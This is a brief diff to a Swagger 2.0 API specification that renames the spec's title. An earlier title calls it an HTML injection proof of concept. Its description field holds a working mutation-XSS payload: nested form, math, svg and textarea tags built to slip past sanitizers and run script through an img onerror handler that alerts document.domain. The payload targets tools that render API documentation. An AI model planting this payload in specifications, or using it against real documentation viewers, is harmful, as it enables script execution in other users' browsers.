@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: HTML INJECTION FOR POC PURPOSE
+  title: HTML INJECTION AA
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1></form>
 
